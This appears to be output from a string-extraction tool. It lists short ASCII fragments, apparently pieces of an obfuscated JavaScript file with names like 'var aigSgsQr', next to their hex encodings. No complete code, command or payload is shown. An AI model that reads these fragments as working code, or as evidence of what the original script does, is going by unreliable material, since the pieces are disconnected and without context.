+|Hex String| 'ag                |20276167                                     |
+|Hex String|var aigSgsQr        |76617220616967536773517220                   |
+|Hex String|aex70               |616578373020                                 |
+|Hex String|ig 5445             |69672035343435                               |
+|Hex String|var a5p             |76617220613570                               |
+|Hex String|0ig                 |30696720                                     |
+|Hex String|Ddy                 |44647920                                     |
+|Hex String| 'aigguD            |2027616967677544                             |
+|Hex String| igtrue             |20696774727565                               |
+|Hex String|ahCpS               |616843705320                                 |
+|Hex String|as4di               |6173346469                                   |
+|Hex String|('regsigvr33 '      |282772656773696776723333202720               |
+|Hex String| ayYRb)             |20617959526229                               |
+|Hex String|var aPD             |76617220615044                               |
+|Hex String| 34755ig            |2033343735356967                             |
+|Hex String|65379ig             |36353337396967                               |
+|Hex String|var a3B             |76617220613342                               |
+|Hex String| 'aQc               |2027615163                                   |
+|Hex String|qig'                |71696727                                     |
+|Hex String|var ar              |766172206172                                 |
+|Hex String| a3B                |20613342                                     |
+|Hex String| 20431              |203230343331                                 |
+|Hex String|$ru`xu              |247275607875                                 |
+|Hex String|`1$pCe5vb`          |60312470436535766260                         |
+|Hex String|sECTYB              |734543545942                                 |
+|Hex String|0xxx                |30787878                                     |
++----------+--------------------+---------------------------------------------+
+
